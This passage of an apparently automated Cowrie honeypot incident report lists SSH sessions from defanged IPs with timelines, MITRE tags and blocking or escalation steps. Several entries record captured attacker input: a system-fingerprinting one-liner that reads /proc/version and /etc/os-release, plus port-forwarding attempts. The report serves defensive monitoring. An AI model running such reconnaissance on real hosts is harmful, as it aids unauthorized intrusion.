| `2026-08-19 12:41:30` | `cowrie.log.closed` |
| `2026-08-19 12:41:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76d87ce0c85b

| Field | Detail |
|---|---|
| **Source IP** | `103.120.116[.]162` |
| **First Seen** | 2026-08-19 12:41 |
| **Last Seen** | 2026-08-19 12:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:41:32` | `cowrie.session.connect` |
| `2026-08-19 12:41:33` | `cowrie.client.version` |
| `2026-08-19 12:41:33` | `cowrie.client.kex` |
| `2026-08-19 12:41:35` | `cowrie.login.success` |
| `2026-08-19 12:41:35` | `cowrie.direct-tcpip.request` |
| `2026-08-19 12:41:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.120.116[.]162` to AbuseIPDB if not already reported
- [ ] Block `103.120.116[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e7ac56f2390

| Field | Detail |
|---|---|
| **Source IP** | `106.245.246[.]26` |
| **First Seen** | 2026-08-19 12:41 |
| **Last Seen** | 2026-08-19 12:41 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:41:45` | `cowrie.session.connect` |
| `2026-08-19 12:41:46` | `cowrie.client.version` |
| `2026-08-19 12:41:46` | `cowrie.client.kex` |
| `2026-08-19 12:41:49` | `cowrie.login.success` |
| `2026-08-19 12:41:49` | `cowrie.direct-tcpip.request` |
| `2026-08-19 12:41:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.245.246[.]26` to AbuseIPDB if not already reported
- [ ] Block `106.245.246[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96cc66c64dcd

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 12:41 |
| **Last Seen** | 2026-08-19 12:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:41:57` | `cowrie.session.connect` |
| `2026-08-19 12:41:57` | `cowrie.client.version` |
| `2026-08-19 12:41:57` | `cowrie.client.kex` |
| `2026-08-19 12:41:57` | `cowrie.login.success` |
| `2026-08-19 12:41:58` | `cowrie.session.params` |
| `2026-08-19 12:41:58` | `cowrie.command.input` |
| `2026-08-19 12:41:58` | `cowrie.log.closed` |
| `2026-08-19 12:41:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5be2e0224e3f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 12:42 |
| **Last Seen** | 2026-08-19 12:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:42:15` | `cowrie.session.connect` |
| `2026-08-19 12:42:15` | `cowrie.client.version` |
| `2026-08-19 12:42:15` | `cowrie.client.kex` |
| `2026-08-19 12:42:16` | `cowrie.login.success` |
| `2026-08-19 12:42:18` | `cowrie.session.params` |
| `2026-08-19 12:42:18` | `cowrie.command.input` |
| `2026-08-19 12:42:18` | `cowrie.command.input` |
| `2026-08-19 12:42:18` | `cowrie.command.input` |
| `2026-08-19 12:42:18` | `cowrie.command.input` |
| `2026-08-19 12:42:18` | `cowrie.command.input` |
| `2026-08-19 12:42:18` | `cowrie.command.success` |
| `2026-08-19 12:42:18` | `cowrie.command.input` |
| `2026-08-19 12:42:18` | `cowrie.command.input` |
| `2026-08-19 12:42:18` | `cowrie.command.input` |
| `2026-08-19 12:42:18` | `cowrie.command.input` |
| `2026-08-19 12:42:18` | `cowrie.log.closed` |
| `2026-08-19 12:42:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d36373079082

| Field | Detail |
|---|---|
| **Source IP** | `202.82.20[.]241` |
| **First Seen** | 2026-08-19 12:42 |
| **Last Seen** | 2026-08-19 12:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:42:35` | `cowrie.session.connect` |
| `2026-08-19 12:42:36` | `cowrie.client.version` |
| `2026-08-19 12:42:36` | `cowrie.client.kex` |
| `2026-08-19 12:42:38` | `cowrie.login.success` |
| `2026-08-19 12:42:38` | `cowrie.direct-tcpip.request` |
| `2026-08-19 12:42:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.82.20[.]241` to AbuseIPDB if not already reported
- [ ] Block `202.82.20[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f97b531c010

| Field | Detail |
|---|---|
| **Source IP** | `211.228.114[.]53` |
| **First Seen** | 2026-08-19 12:42 |
| **Last Seen** | 2026-08-19 12:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:42:59` | `cowrie.session.connect` |
| `2026-08-19 12:43:00` | `cowrie.client.version` |
| `2026-08-19 12:43:00` | `cowrie.client.kex` |
| `2026-08-19 12:43:02` | `cowrie.login.success` |
| `2026-08-19 12:43:03` | `cowrie.direct-tcpip.request` |
| `2026-08-19 12:43:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.114[.]53` to AbuseIPDB if not already reported
- [ ] Block `211.228.114[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0393a40f89e

| Field | Detail |
|---|---|
| **Source IP** | `2.55.125[.]200` |
| **First Seen** | 2026-08-19 12:43 |
| **Last Seen** | 2026-08-19 12:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:43:08` | `cowrie.session.connect` |
| `2026-08-19 12:43:09` | `cowrie.client.version` |
| `2026-08-19 12:43:09` | `cowrie.client.kex` |
| `2026-08-19 12:43:10` | `cowrie.login.success` |
| `2026-08-19 12:43:11` | `cowrie.direct-tcpip.request` |
| `2026-08-19 12:43:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.55.125[.]200` to AbuseIPDB if not already reported
- [ ] Block `2.55.125[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ef031f31ad1

| Field | Detail |
|---|---|
| **Source IP** | `223.241.214[.]127` |
| **First Seen** | 2026-08-19 12:43 |
| **Last Seen** | 2026-08-19 12:43 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:43:12` | `cowrie.session.connect` |
| `2026-08-19 12:43:13` | `cowrie.client.version` |
| `2026-08-19 12:43:13` | `cowrie.client.kex` |
| `2026-08-19 12:43:16` | `cowrie.login.success` |
| `2026-08-19 12:43:17` | `cowrie.direct-tcpip.request` |
| `2026-08-19 12:43:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.241.214[.]127` to AbuseIPDB if not already reported
- [ ] Block `223.241.214[.]127` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8d34c1cc27d

| Field | Detail |
|---|---|
| **Source IP** | `111.70.11[.]78` |
| **First Seen** | 2026-08-19 12:43 |
| **Last Seen** | 2026-08-19 12:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:43:24` | `cowrie.session.connect` |
| `2026-08-19 12:43:24` | `cowrie.client.version` |
| `2026-08-19 12:43:24` | `cowrie.client.kex` |
| `2026-08-19 12:43:27` | `cowrie.login.success` |
| `2026-08-19 12:43:27` | `cowrie.direct-tcpip.request` |
| `2026-08-19 12:43:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.11[.]78` to AbuseIPDB if not already reported
- [ ] Block `111.70.11[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-303f2b8da6d5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 12:44 |
| **Last Seen** | 2026-08-19 12:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:44:44` | `cowrie.session.connect` |
| `2026-08-19 12:44:44` | `cowrie.client.version` |
| `2026-08-19 12:44:44` | `cowrie.client.kex` |
| `2026-08-19 12:44:46` | `cowrie.login.success` |
| `2026-08-19 12:44:47` | `cowrie.session.params` |
| `2026-08-19 12:44:47` | `cowrie.command.input` |
| `2026-08-19 12:44:47` | `cowrie.command.input` |
| `2026-08-19 12:44:47` | `cowrie.command.input` |
| `2026-08-19 12:44:47` | `cowrie.command.input` |
| `2026-08-19 12:44:47` | `cowrie.command.input` |
| `2026-08-19 12:44:47` | `cowrie.command.success` |
| `2026-08-19 12:44:47` | `cowrie.command.input` |
| `2026-08-19 12:44:47` | `cowrie.command.input` |
| `2026-08-19 12:44:47` | `cowrie.command.input` |
| `2026-08-19 12:44:47` | `cowrie.command.input` |
| `2026-08-19 12:44:48` | `cowrie.log.closed` |
| `2026-08-19 12:44:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3326ae7d2c2

| Field | Detail |
|---|---|
| **Source IP** | `194.164.107[.]6` |
| **First Seen** | 2026-08-19 12:46 |
| **Last Seen** | 2026-08-19 12:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:46:57` | `cowrie.session.connect` |
| `2026-08-19 12:46:57` | `cowrie.login.success` |
| `2026-08-19 12:46:58` | `cowrie.session.params` |
| `2026-08-19 12:46:58` | `cowrie.command.input` |
| `2026-08-19 12:46:58` | `cowrie.command.input` |
| `2026-08-19 12:46:58` | `cowrie.command.failed` |
| `2026-08-19 12:46:58` | `cowrie.command.input` |
| `2026-08-19 12:46:58` | `cowrie.command.failed` |
| `2026-08-19 12:46:58` | `cowrie.command.input` |
| `2026-08-19 12:46:58` | `cowrie.log.closed` |
| `2026-08-19 12:46:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.164.107[.]6` to AbuseIPDB if not already reported
- [ ] Block `194.164.107[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb5c752e1bc2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 12:47 |
| **Last Seen** | 2026-08-19 12:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:47:10` | `cowrie.session.connect` |
| `2026-08-19 12:47:11` | `cowrie.client.version` |
| `2026-08-19 12:47:11` | `cowrie.client.kex` |
| `2026-08-19 12:47:12` | `cowrie.login.success` |
| `2026-08-19 12:47:13` | `cowrie.session.params` |
| `2026-08-19 12:47:13` | `cowrie.command.input` |
| `2026-08-19 12:47:13` | `cowrie.command.input` |
| `2026-08-19 12:47:13` | `cowrie.command.input` |
| `2026-08-19 12:47:13` | `cowrie.command.input` |
| `2026-08-19 12:47:13` | `cowrie.command.input` |
| `2026-08-19 12:47:13` | `cowrie.command.success` |
| `2026-08-19 12:47:13` | `cowrie.command.input` |
| `2026-08-19 12:47:13` | `cowrie.command.input` |
| `2026-08-19 12:47:13` | `cowrie.command.input` |
| `2026-08-19 12:47:13` | `cowrie.command.input` |
| `2026-08-19 12:47:13` | `cowrie.log.closed` |
| `2026-08-19 12:47:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1d47f4f36e4

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 12:47 |
| **Last Seen** | 2026-08-19 12:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:47:53` | `cowrie.session.connect` |
| `2026-08-19 12:47:53` | `cowrie.client.version` |
| `2026-08-19 12:47:53` | `cowrie.client.kex` |
| `2026-08-19 12:47:53` | `cowrie.login.success` |
| `2026-08-19 12:47:54` | `cowrie.session.params` |
| `2026-08-19 12:47:54` | `cowrie.command.input` |
| `2026-08-19 12:47:54` | `cowrie.log.closed` |
| `2026-08-19 12:47:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37156082f743

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 12:49 |
| **Last Seen** | 2026-08-19 12:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:49:30` | `cowrie.session.connect` |
| `2026-08-19 12:49:30` | `cowrie.client.version` |
| `2026-08-19 12:49:30` | `cowrie.client.kex` |
| `2026-08-19 12:49:31` | `cowrie.login.success` |
| `2026-08-19 12:49:33` | `cowrie.session.params` |
| `2026-08-19 12:49:33` | `cowrie.command.input` |
| `2026-08-19 12:49:33` | `cowrie.command.input` |
| `2026-08-19 12:49:33` | `cowrie.command.input` |
| `2026-08-19 12:49:33` | `cowrie.command.input` |
| `2026-08-19 12:49:33` | `cowrie.command.input` |
| `2026-08-19 12:49:33` | `cowrie.command.success` |
| `2026-08-19 12:49:33` | `cowrie.command.input` |
| `2026-08-19 12:49:33` | `cowrie.command.input` |
| `2026-08-19 12:49:33` | `cowrie.command.input` |
| `2026-08-19 12:49:33` | `cowrie.command.input` |
| `2026-08-19 12:49:33` | `cowrie.log.closed` |
| `2026-08-19 12:49:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8cae333b4c9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 12:51 |
| **Last Seen** | 2026-08-19 12:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:51:32` | `cowrie.session.connect` |
| `2026-08-19 12:51:33` | `cowrie.client.version` |
| `2026-08-19 12:51:33` | `cowrie.client.kex` |
| `2026-08-19 12:51:34` | `cowrie.login.success` |
| `2026-08-19 12:51:35` | `cowrie.session.params` |
| `2026-08-19 12:51:35` | `cowrie.command.input` |
| `2026-08-19 12:51:35` | `cowrie.command.input` |
| `2026-08-19 12:51:35` | `cowrie.command.input` |
| `2026-08-19 12:51:35` | `cowrie.command.input` |
| `2026-08-19 12:51:35` | `cowrie.command.input` |
| `2026-08-19 12:51:35` | `cowrie.command.success` |
| `2026-08-19 12:51:35` | `cowrie.command.input` |
| `2026-08-19 12:51:35` | `cowrie.command.input` |
| `2026-08-19 12:51:35` | `cowrie.command.input` |
| `2026-08-19 12:51:36` | `cowrie.command.input` |
| `2026-08-19 12:51:36` | `cowrie.log.closed` |
| `2026-08-19 12:51:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56710e9e3f2f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 12:53 |
| **Last Seen** | 2026-08-19 12:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:53:41` | `cowrie.session.connect` |
| `2026-08-19 12:53:41` | `cowrie.client.version` |
| `2026-08-19 12:53:41` | `cowrie.client.kex` |
| `2026-08-19 12:53:44` | `cowrie.login.success` |
| `2026-08-19 12:53:45` | `cowrie.session.params` |
| `2026-08-19 12:53:45` | `cowrie.command.input` |
| `2026-08-19 12:53:45` | `cowrie.command.input` |
| `2026-08-19 12:53:45` | `cowrie.command.input` |
| `2026-08-19 12:53:45` | `cowrie.command.input` |
| `2026-08-19 12:53:45` | `cowrie.command.input` |
| `2026-08-19 12:53:45` | `cowrie.command.success` |
| `2026-08-19 12:53:45` | `cowrie.command.input` |
| `2026-08-19 12:53:45` | `cowrie.command.input` |
| `2026-08-19 12:53:45` | `cowrie.command.input` |
| `2026-08-19 12:53:45` | `cowrie.command.input` |
| `2026-08-19 12:53:46` | `cowrie.log.closed` |
| `2026-08-19 12:53:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e99eb2122e82

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 12:53 |
| **Last Seen** | 2026-08-19 12:53 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:53:45` | `cowrie.session.connect` |
| `2026-08-19 12:53:46` | `cowrie.client.version` |
| `2026-08-19 12:53:46` | `cowrie.client.kex` |
| `2026-08-19 12:53:53` | `cowrie.login.success` |
| `2026-08-19 12:53:57` | `cowrie.session.params` |
| `2026-08-19 12:53:57` | `cowrie.command.input` |
| `2026-08-19 12:53:58` | `cowrie.log.closed` |
| `2026-08-19 12:53:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c5ceeea5ec5

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 12:53 |
| **Last Seen** | 2026-08-19 12:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:53:49` | `cowrie.session.connect` |
| `2026-08-19 12:53:49` | `cowrie.client.version` |
| `2026-08-19 12:53:49` | `cowrie.client.kex` |
| `2026-08-19 12:53:49` | `cowrie.login.success` |
| `2026-08-19 12:53:50` | `cowrie.session.params` |
| `2026-08-19 12:53:50` | `cowrie.command.input` |
| `2026-08-19 12:53:50` | `cowrie.log.closed` |
| `2026-08-19 12:53:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🟡 MEDIUM · IR-03814aec557c

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 10:55 |
| **Last Seen** | 2026-08-19 10:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 0 |
| **Auth Success** | ❌ No |
| **Commands Executed** | `uname -a` |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
